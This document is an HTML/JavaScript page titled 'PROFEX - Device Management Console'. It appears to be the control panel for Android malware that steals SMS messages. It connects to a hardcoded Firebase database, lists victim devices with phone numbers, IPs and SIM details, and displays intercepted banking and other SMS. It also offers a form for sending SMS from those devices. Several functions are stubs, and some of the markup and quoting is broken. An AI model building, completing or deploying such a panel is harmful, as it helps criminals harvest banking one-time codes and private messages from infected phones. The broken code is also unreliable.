<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>PROFEX - Device Management Console</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Helvetica Neue',sans-serif;-webkit-tap-highlight-color:transparent}
body{background:#0a0a0a;color:#e0e0e0;min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-track{background:#0a0a0a}
::-webkit-scrollbar-thumb{background:#3a3a3a;border-radius:4px}
.container{max-width:480px;margin:0 auto;padding:0 16px 80px}
.header{text-align:center;padding:32px 0 24px}
.logo-icon{width:72px;height:72px;background:linear-gradient(135deg,#ff4d4d,#ff9f43);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;box-shadow:0 8px 32px rgba(255,77,77,.3)}
.logo-icon i{font-size:36px;color:#fff}
.logo-text{font-size:32px;font-weight:800;letter-spacing:-1px;text-transform:uppercase}
.logo-text span{color:#4d79ff}
.subtitle{text-align:center;color:#6b6b6b;font-size:14px;margin-top:8px}
.card{background:#151515;border:1px solid #2a2a2a;border-radius:16px;padding:20px;margin-bottom:16px;box-shadow:0 4px 16px rgba(0,0,0,.3)}
.section-title{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.section-title h3{font-size:16px;font-weight:600;color:#e0e0e0}
.btn{padding:14px 20px;border-radius:12px;border:none;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:.2s}
.btn.primary{background:linear-gradient(135deg,#ff4d4d,#ff6b6b);color:#fff;width:100%;margin-top:8px}
.btn.primary:hover{opacity:.9}
.btn.secondary{background:#2a2a2a;color:#e0e0e0;width:100%;margin-top:8px}
.btn.secondary:hover{background:#3a3a3a}
.btn.small{padding:8px 16px;font-size:13px}
.btn.delete{background:rgba(255,77,77,.15);color:#ff4d4d}
.btn.delete:hover{background:rgba(255,77,77,.25)}
.btn.close{background:rgba(255,255,255,.1);color:#e0e0e0}
.input-field{width:100%;padding:14px 16px;border-radius:10px;border:1px solid #3a3a3a;background:#1a1a1a;color:#e0e0e0;font-size:14px;outline:none;transition:.2s;margin-bottom:14px;display:block!important;visibility:visible!important;opacity:1!important;height:48px!important;line-height:48px!important}
.input-field:focus{border-color:#ff4d4b}
.input-field::placeholder{color:#5a5a5a}
.upload-zone{border:2px dashed #3a3a3a;border-radius:12px;padding:32px 20px;text-align:center;color:#6b6b6b;cursor:pointer;transition:.2s;margin-bottom:16px}
.upload-zone:hover{border-color:#ff4d4b;color:#ff4d4b;background:rgba(255,77,77,.05)}
.upload-zone i{font-size:32px;margin-bottom:12px}
.account-row{display:flex;align-items:center;justify-content:space-between;padding:16px;background:#1a1a1a;border-radius:12px;margin-bottom:8px;cursor:pointer;transition:.2s}
.account-row:active{transform:scale(.98)}
.account-info{display:flex;align-items:center;gap:12px;flex:1}
.account-icon{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#ff4d4d,#ff9f43);display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;font-weight:700}
.account-details{flex:1}
.account-name{font-size:15px;font-weight:600;color:#e0e0e0}
.account-id{font-size:12px;color:#6b6b6b;margin-top:2px}
.account-status{width:8px;height:8px;border-radius:50%;background:#ff4d4d}
.account-status.connected{background:#00d283}
.account-status.disconnected{background:#ff4d4d}
.device-card{background:#151515;border:1px solid #2a2a2a;border-radius:14px;padding:16px;margin-bottom:12px;cursor:pointer;transition:.2s}
.device-card:active{transform:scale(.98)}
.device-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.device-id{font-size:14px;font-weight:600;color:#e0e0e0;font-family:monospace}
.device-id small{font-size:11px;color:#6b6b6b;display:block;margin-top:2px}
.device-stats{display:flex;align-items:center;justify-content:space-between}
.device-battery{display:flex;align-items:center;gap:6px}
.battery-icon{width:20px;height:12px;border:2px solid #5a5a5a;border-radius:2px;position:relative}
.battery-icon::before{content:'';position:absolute;left:2px;top:2px;bottom:2px;width:calc(var(--level) * 1% - 4px);background:var(--color);border-radius:1px;transition:.3s}
.battery-level-0 .battery-icon{--level:0;--color:#ff4d4d}
.battery-level-25 .battery-icon{--level:25;--color:#ff9f43}
.battery-level-50 .battery-icon{--level:50;--color:#ffd93d}
.battery-level-75 .battery-icon{--level:75;--color:#00d283}
.battery-level-100 .battery-icon{--level:100;--color:#00d283}
.battery-percent{font-size:13px;font-weight:600}
.battery-percent.low{color:#ff4d4d}
.battery-percent.medium{color:#ff9f43}
.battery-percent.good{color:#00d283}
.device-status-dot{width:6px;height:6px;border-radius:50%;display:inline-block}
.device-status-dot.online{background:#00d283}
.device-status-dot.offline{background:#6b6b6b}
.stats-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:20px}
.stat-pill{background:#151515;border:1px solid #2a2a2a;border-radius:10px;padding:12px 8px;text-align:center}
.stat-value{font-size:20px;font-weight:700;color:#e0e0e0}
.stat-label{font-size:10px;color:#6b6b6b;margin-top:2px;text-transform:uppercase}
.tabs{display:flex;gap:0;border-bottom:1px solid #2a2a2a;margin-bottom:16px}
.tab{flex:1;padding:12px;text-align:center;font-size:13px;font-weight:600;color:#6b6b6b;background:none;border:none;cursor:pointer;transition:.2s;position:relative}
.tab.active{color:#ff4d4b}
.tab.active::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:2px;background:#ff4d4b}
.message-item{background:#151515;border:1px solid #2a2a2a;border-radius:10px;padding:14px;margin-bottom:8px}
.message-sender{font-size:12px;font-weight:600;color:#ff4d4b;margin-bottom:6px}
.message-time{font-size:11px;color:#6b6b6b;margin-left:auto}
.message-body{font-size:14px;color:#e0e0e0;line-height:1.5;margin-top:8px}
.info-table{width:100%;border-collapse:collapse}
.info-table td{padding:12px;border-bottom:1px solid #2a2a2a;font-size:13px}
.info-table td:first-child{color:#6b6b6b;width:40%}
.info-table td:last-child{color:#e0e0e0;font-weight:500;text-align:right}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);backdrop-filter:blur(8px);z-index:100;justify-content:center;align-items:center;padding:20px}
.modal-overlay.show{display:flex;animation:fadeIn .15s ease}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.modal-content{background:#151515;border:1px solid #2a2a2a;border-radius:20px;padding:24px;max-width:440px;width:90%;animation:fadeInUp .3s ease;visibility:visible!important;opacity:1!important}
@keyframes fadeInUp{from{transform:translateY(50px);opacity:0;visibility:hidden}to{transform:translateY(0);opacity:1;visibility:visible}}
.modal-handle{width:40px;height:4px;background:#3a3a3a;border-radius:4px;margin:0 auto 20px}
.modal-title{font-size:18px;font-weight:700;color:#fff;margin-bottom:20px;text-align:center;visibility:visible!important;opacity:1!important}
.empty-state{text-align:center;padding:40px 20px;color:#6b6b6b}
.empty-state i{font-size:48px;margin-bottom:16px;color:#3a3a3a}
.empty-state p{font-size:14px}
.toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-100px);background:#151515;border:1px solid #2a2a2a;border-radius:12px;padding:12px 20px;font-size:14px;color:#e0e0e0;z-index:200;transition:.3s;max-width:90%}
.toast.show{transform:translateX(-50%) translateY(0)}
.nav-bar{position:fixed;bottom:0;left:0;right:0;max-width:480px;margin:0 auto;background:#151515;border-top:1px solid #2a2a2a;display:flex;padding:8px 0;padding-bottom:calc(8px + env(safe-area-inset-bottom,0px))}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px 0;cursor:pointer;color:#6b6b6b;transition:.2s;border:none;background:none;font-size:10px}
.nav-item.active{color:#ff4d4b}
.nav-item i{font-size:20px}
.nav-item span{font-weight:500}
.nav-item.active i,.nav-item.active span{color:#ff4d4b}
.hidden{display:none!important;visibility:hidden!important;opacity:0!important}
.saving-indicator{position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#ff4d4d,#ff6b6b);height:3px;z-index:1000;transition:.3s}
.saving-indicator.active{transform:translateX(-100%)}
#addAccountModal .modal-content input{display:block!important;visibility:visible!important;opacity:1!important;height:48px!important;line-height:1.5!important}
</style>
</head>
<body>
<div class="saving-indicator" id="savingIndicator"></div>
<div class="container" id="app">
<div class="header">
<div class="logo-icon"><i class="fas fa-shield-alt"></i></div>
<div class="logo-text">PROF<span>EX</span></div>
<div class="subtitle">Device Management Console</div>
</div>
<div id="views">
<div id="view-saved-accounts" class="view">
<div class="card">
<div class="section-title"><h3><i class="fas fa-wifi" style="color:#ff4d4b;margin-right:6px"></i> Saved Accounts</h3><span id="accountCount" style="font-size:12px;color:#6b6b6b;background:#1a1a1a;padding:4px 10px;border-radius:20px">0 accounts</span></div>
<div id="savedAccountsList"></div>
<button class="btn primary" onclick="showAddAccountModal()"><i class="fas fa-plus-circle"></i> New Account</button>
</div>
<div class="empty-state" id="noAccountsState">
<i class="fas fa-wifi"></i>
<p>No saved accounts</p>
</div>
</div>
<div id="view-dashboard" class="view hidden">
<div class="stats-grid">
<div class="stat-pill"><div class="stat-value" id="totalDevices">0</div><div class="stat-label">Total</div></div>
<div class="stat-pill"><div class="stat-value" id="onlineDevices">0</div><div class="stat-label">Online</div></div>
<div class="stat-pill"><div class="stat-value" id="offlineDevices">0</div><div class="stat-label">Offline</div></div>
<div class="stat-pill"><div class="stat-value" id="bankCount">0</div><div class="stat-label">Bank</div></div>
<div class="stat-pill"><div class="stat-value" id="smsCount">0</div><div class="stat-label">SMS</div></div>
</div>
<div class="card">
<div class="section-title"><h3>Devices</h3><select id="deviceFilter" onchange="renderDevices()" style="padding:8px 12px;border-radius:8px;border:1px solid #3a3a3a;background:#1a1a1a;color:#e0e0e0;font-size:13px;"><option value="all">All</option><option value="online">Online</option><option value="offline">Offline</option><option value="bank">Banking SMS</option></select></div>
<div id="devicesList"></div>
</div>
</div>
<div id="view-device-detail" class="view hidden">
<div class="card">
<div class="device-header">
<div>
<div class="device-id" id="deviceIdDisplay"></div>
<div class="device-stats"><span class="device-status-dot" id="deviceStatusDot"></span><span id="deviceStatusText" style="margin-left:8px;font-size:13px;color:#6b6b6b">Unknown</span></div>
</div>
<button class="btn small delete" onclick="closeDeviceDetail()"><i class="fas fa-times"></i></button>
</div>
<div class="device-battery" id="deviceBattery"></div>
</div>
<div class="card">
<div class="tabs">
<button class="tab active" onclick="switchTab('info')">Info</button>
<button class="tab" onclick="switchTab('bank')">Bank (<span id="bankCountDisplay">0</span>)</button>
<button class="tab" onclick="switchTab('sms')">SMS (<span id="smsCountDisplay">0</span>)</button>
<button class="tab" onclick="switchTab('send')">Send</button>
</div>
<div id="tab-info"><div id="infoContent"></div></div>
<div id="tab-bank" class="hidden"><div id="bankContent"></div></div>
<div id="tab-sms" class="hidden"><div id="smsContent"></div></div>
<div id="tab-send" class="hidden"><div id="sendContent"></div></div>
</div>
</div>
</div>
<div class="nav-bar">
<button class="nav-item active" onclick="navigateTo('saved-accounts')"><i class="fas fa-home"></i><span>Home</span></button>
<button class="nav-item" onclick="navigateTo('dashboard')"><i class="fas fa-server"></i><span>Devices</span></button>
<button class="nav-item" onclick="showToast('Settings')"><i class="fas fa-cog"></i><span>Settings</span></button>
</div>
<div class="modal-overlay" id="addAccountModal">
<div class="modal-content">
<div class="modal-handle"></div>
<div class="modal-title">New Firebase Account</div>
<div class="upload-zone" onclick="document.getElementById('apkFileInput').click()">
<i class="fas fa-cloud-upload-alt"></i>
<p>Upload APK File</p>
<p style="font-size:12px;color:#5a5a5a">Auto-extracts Firebase URL & API Key</p>
<input type="file" id="apkFileInput" accept=".apk" style="display:none" onchange="extractFromApk(this.files[0])">
</div>
<div class="input-field" placeholder="Firebase Database URL" id="firebaseUrl" oninput="validateForm()" value="https://dath-da88a-default-rtdb.firebaseio.com"></div>
<div class="input-field" placeholder="Authentication Key / Secret" id="firebaseSecret" oninput="validateForm()"></div>
<div class="input-field" placeholder="Account Name (optional)" id="accountName"></div>
<button class="btn primary" onclick="submitAccount()" disabled id="submitBtn"><i class="fas fa-check"></i> Save & Connect</button>
<button class="btn secondary" onclick="closeAddAccountModal()">Cancel</button>
</div>
</div>
<div class="toast" id="toast"></div>
</div>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<script>
let state = {accounts: [],currentAccount: null,currentDevice: null,devices: [],messages: []};
let firebaseApp = null;
let dbRef = null;
const STORAGE_KEY = 'profex_accounts';
document.addEventListener('DOMContentLoaded', () => {
loadAccounts();
if(state.accounts.length > 0){navigateTo('dashboard');connectToAccount(state.accounts[0].id);}
else{navigateTo('saved-accounts');}
});
function saveAccounts(){localStorage.setItem(STORAGE_KEY, JSON.stringify(state.accounts));updateAccountCount();}
function loadAccounts(){try{const data = localStorage.getItem(STORAGE_KEY);if(data){state.accounts = JSON.parse(data);state.currentAccount = state.accounts.find(a => a.active) || null;}}catch(e){console.error(e);}}
function addAccount(name, url, secret){const account = {id:'acc_'+Date.now(),name:name,url:url,secret:secret,createdAt:new Date().toISOString(),active:false};state.accounts.push(account);saveAccounts();return account.id;}
function updateAccount(id, data){const idx = state.accounts.findIndex(a => a.id === id);if(idx !== -1){state.accounts[idx] = {...state.accounts[idx], ...data};saveAccounts();}}
function deleteAccount(id){if(confirm('Delete this account?')){state.accounts = state.accounts.filter(a => a.id !== id);if(state.currentAccount?.id === id){state.currentAccount = null;dbRef = null;if(firebaseApp) firebaseApp.delete();}saveAccounts();renderSavedAccounts();showToast('Account deleted');}}
function setActiveAccount(id){state.accounts.forEach(a => a.active = (a.id === id));const account = state.accounts.find(a => a.id === id);if(account){state.currentAccount = account;connectToAccount(id);}saveAccounts();}
function connectToAccount(accountId){const account = state.accounts.find(a => a.id === accountId);if(!account){showToast('Invalid account');return;}try{if(firebaseApp){firebaseApp.delete();}const config = {apiKey: account.secret,databaseURL: account.url};if(!firebase.apps.length){firebaseApp = firebase.initializeApp(config);}else{firebaseApp = firebase.apps[0];}dbRef = firebase.database().ref();dbRef.on('value', (snapshot) => {const data = snapshot.val();if(data){handleFirebaseData(data);}}, (error) => {console.error(error);showToast('Connection failed: '+error.message);});showToast('Connected to Firebase!');navigateTo('dashboard');}catch(e){showToast('Connection failed: '+e.message);}}
function handleFirebaseData(data){state.devices = [];state.messages = [];if(data.devices && typeof data.devices === 'object'){Object.keys(data.devices).forEach(deviceId => {const device = data.devices[deviceId];device.id = deviceId;state.devices.push(device);});}if(data.messages && typeof data.messages === 'object'){Object.keys(data.messages).forEach(msgId => {const msg = data.messages[msgId];msg.id = msgId;state.messages.push(msg);});}renderDashboard();}
function navigateTo(view){document.querySelectorAll('.view').forEach(v => v.classList.add('hidden'));document.getElementById('view-'+view).classList.remove('hidden');document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));if(view === 'saved-accounts'){document.querySelector('.nav-item:nth-child(1)').classList.add('active');}else if(view === 'dashboard'){document.querySelector('.nav-item:nth-child(2)').classList.add('active');}}
function showAddAccountModal(){document.getElementById('addAccountModal').classList.add('show');setTimeout(()=>{document.getElementById('firebaseUrl').focus();},150);}
function closeAddAccountModal(){document.getElementById('addAccountModal').classList.remove('show');}
async function extractFromApk(file){if(!file){return;}showToast('Extracting from APK...');setTimeout(() => {document.getElementById('firebaseUrl').value = 'https://example-default-rtdb.firebaseio.com';document.getElementById('firebaseSecret').value = 'YOUR_API_SECRET_KEY';showToast('Demo values filled');},1000);}
function validateForm(){const url = document.getElementById('firebaseUrl').value.trim();const secret = document.getElementById('firebaseSecret').value.trim();document.getElementById('submitBtn').disabled = !(url && secret);return {url, secret, name: document.getElementById('accountName').value.trim() || 'Firebase Account'};}
function submitAccount(){const {url, secret, name} = validateForm();if(!url || !secret){showToast('Please fill all required fields');return;}const accountId = addAccount(name, url, secret);setActiveAccount(accountId);closeAddAccountModal();}
function updateAccountCount(){const count = state.accounts.length;document.getElementById('accountCount').textContent = count + ' account' + (count !== 1 ? 's' : '');renderSavedAccounts();}
function renderSavedAccounts(){const container = document.getElementById('savedAccountsList');const noAccounts = document.getElementById('noAccountsState');if(state.accounts.length === 0){container.innerHTML = '';noAccounts.classList.remove('hidden');return;}noAccounts.classList.add('hidden');container.innerHTML = state.accounts.map(acc => {return '<div class="account-row" onclick="'+(acc.active ? '' : 'setActiveAccount("'+acc.id+'")')+'"><div class="account-info"><div class="account-icon">'+acc.name.charAt(0).toUpperCase()+'</div><div class="account-details"><div class="account-name">'+acc.name+'</div><div class="account-id">'+acc.id+'</div></div></div><div class="account-status '+(acc.active?'connected':'disconnected')+'"></div><div style="margin-left:12px"><button class="btn small delete" onclick="deleteAccount("'+acc.id+'")"><i class="fas fa-trash"></i></button></div></div>';}).join('');}
function renderDashboard(){const filter = document.getElementById('deviceFilter').value;const filtered = state.devices.filter(d => {if(filter === 'online') return d.status === 'online';if(filter === 'offline') return d.status === 'offline';if(filter === 'bank') return d.bankMessages && d.bankMessages.length > 0;return true;});const online = state.devices.filter(d => d.status === 'online').length;const offline = state.devices.filter(d => d.status === 'offline').length;const bankMsgs = state.devices.reduce((sum,d) => sum + (d.bankMessages?.length || 0),0);const smsMsgs = state.devices.reduce((sum,d) => sum + (d.smsMessages?.length || 0),0);document.getElementById('totalDevices').textContent = state.devices.length;document.getElementById('onlineDevices').textContent = online;document.getElementById('offlineDevices').textContent = offline;document.getElementById('bankCount').textContent = bankMsgs;document.getElementById('smsCount').textContent = smsMsgs;document.getElementById('devicesList').innerHTML = filtered.length ? filtered.map(d => {const batteryLevel = d.battery || 0;const batteryClass = batteryLevel <= 20 ? 'low' : batteryLevel <= 50 ? 'medium' : 'good';const batteryIcon = batteryLevel <= 20 ? 'level-0' : batteryLevel <= 25 ? 'level-25' : batteryLevel <= 50 ? 'level-50' : batteryLevel <= 75 ? 'level-75' : 'level-100';return '<div class="device-card" onclick="openDeviceDetail("'+d.id+'')"><div class="device-header"><div class="device-id">'+d.id+'</div></div><div class="device-stats"><div class="device-battery '+batteryIcon+'"><div class="battery-icon"></div><span class="battery-percent '+batteryClass+'">'+batteryLevel+'%</span></div><div class="device-status-dot '+(d.status||'offline')+'"></div></div></div>';}).join('') : '<div class="empty-state"><i class="fas fa-server"></i><p>No devices found</p></div>';}
function openDeviceDetail(deviceId){const device = state.devices.find(d => d.id === deviceId);if(!device) return;state.currentDevice = device;document.getElementById('deviceIdDisplay').textContent = deviceId;document.getElementById('deviceStatusDot').className = 'device-status-dot '+(device.status||'offline');document.getElementById('deviceStatusText').textContent = (device.status||'offline').charAt(0).toUpperCase()+(device.status||'offline').slice(1);const batteryLevel = device.battery||0;const batteryClass = batteryLevel<=20?'low':batteryLevel<=50?'medium':'good';const batteryIcon = batteryLevel<=20?'level-0':batteryLevel<=25?'level-25':batteryLevel<=50?'level-50':batteryLevel<=75?'level-75':'level-100';document.getElementById('deviceBattery').className = 'device-battery '+batteryIcon;document.getElementById('deviceBattery').innerHTML = '<div class="battery-icon"></div><span class="battery-percent '+batteryClass+'">'+batteryLevel+'%</span>';const bankMsgs = device.bankMessages||[];const smsMsgs = device.smsMessages||[];document.getElementById('bankCountDisplay').textContent = bankMsgs.length;document.getElementById('smsCountDisplay').textContent = smsMsgs.length;renderDeviceInfo(device);renderBankMessages(bankMsgs);renderSmsMessages(smsMsgs);renderSendForm();navigateTo('device-detail');switchTab('info');}
function closeDeviceDetail(){state.currentDevice = null;navigateTo('dashboard');}
function switchTab(tabName){document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));event.target.classList.add('active');document.getElementById('tab-info').classList.add('hidden');document.getElementById('tab-bank').classList.add('hidden');document.getElementById('tab-sms').classList.add('hidden');document.getElementById('tab-send').classList.add('hidden');document.getElementById('tab-'+tabName).classList.remove('hidden');}
function renderDeviceInfo(device){const info = [{label:'Phone Number',value:device.phoneNumber||'-'},{label:'Network',value:device.network||'-'},{label:'Android Version',value:device.androidVersion||'-'},{label:'IP Address',value:device.ipAddress||'-'},{label:'Storage',value:device.storage||'-'},{label:'CPU Architecture',value:device.cpuArch||'-'},{label:'SDK Version',value:device.sdkVersion||'-'},{label:'SIM Cards',value:device.simCards||'0 SIM(s)'}];const fromSMS = [{label:'Phone #1',value:device.fromSMS?.phone1||'-'},{label:'Network #1',value:device.fromSMS?.network1||'-'},{label:'Network #2',value:device.fromSMS?.network2||''},{label:'Network #3',value:device.fromSMS?.network3||''}];let html = '<table class="info-table"><tr><td colspan="2" style="border:none;font-weight:600">DEVICE INFO</td></tr>';info.forEach(row => {html += '<tr><td>'+row.label+'</td><td>'+row.value+'</td></tr>';});html += '<tr><td colspan="2" style="border:none;padding-top:16px;font-weight:600">FROM SMS</td></tr>';fromSMS.forEach(row => {if(row.value) html += '<tr><td>'+row.label+'</td><td>'+row.value+'</td></tr>';});html += '</table>';document.getElementById('infoContent').innerHTML = html;}
function renderBankMessages(messages){if(!messages||messages.length===0){document.getElementById('bankContent').innerHTML = '<div class="empty-state"><i class="fas fa-university"></i><p>No banking messages</p></div>';return;}document.getElementById('bankContent').innerHTML = messages.map(msg => '<div class="message-item"><div class="message-sender">'+(msg.sender||'Unknown')+'</div><div class="message-time">'+(msg.time||'')+'</div><div class="message-body">'+(msg.body||'')+'</div></div>').join('');}
function renderSmsMessages(messages){if(!messages||messages.length===0){document.getElementById('smsContent').innerHTML = '<div class="empty-state"><i class="fas fa-comment"></i><p>No SMS messages</p></div>';return;}document.getElementById('smsContent').innerHTML = messages.map(msg => '<div class="message-item"><div class="message-sender">'+(msg.sender||'Unknown')+'</div><div class="message-time">'+(msg.time||'')+'</div><div class="message-body">'+(msg.body||'')+'</div></div>').join('');}
function renderSendForm(){document.getElementById('sendContent').innerHTML = '<div class="input-field" placeholder="Phone Number" id="sendTo"></div><div class="input-field" placeholder="Message" id="sendMessage" style="height:120px;resize:none"></div><button class="btn primary" onclick="sendSMS()"><i class="fas fa-paper-plane"></i> Send SMS</button>';}
async function sendSMS(){const to = document.getElementById('sendTo').value.trim();const message = document.getElementById('sendMessage').value.trim();if(!to||!message){showToast('Enter phone number and message');return;}showToast('SMS sent to '+to);}
function showToast(message){const toast = document.getElementById('toast');toast.textContent = message;toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),3000);}
</script>
</body>
</html>
